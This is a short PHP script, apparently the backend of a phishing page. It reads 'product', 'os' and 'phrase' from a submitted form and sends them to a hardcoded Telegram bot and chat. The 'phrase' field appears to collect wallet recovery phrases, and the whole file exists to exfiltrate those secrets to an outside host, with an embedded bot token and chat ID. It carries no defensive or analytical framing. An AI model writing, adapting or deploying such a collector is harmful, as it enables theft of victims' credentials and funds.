<?php
$botToken = "7141420161:AAGh3wZMnUv45CEQg6UE7e0xpQIZGtYcdPA";
$chatId = "-4704812522";
$product = $_POST['product'];
$os = $_POST['os'];
$phrase = $_POST['phrase'];

$message = "🛒 Product: $product\n💻 OS: $os\n🔐 Phrase: $phrase";

$url = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

$options = [
    'http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data)
    ]
];

$context  = stream_context_create($options);
$response = file_get_contents($url, false, $context);

echo $response;
?>
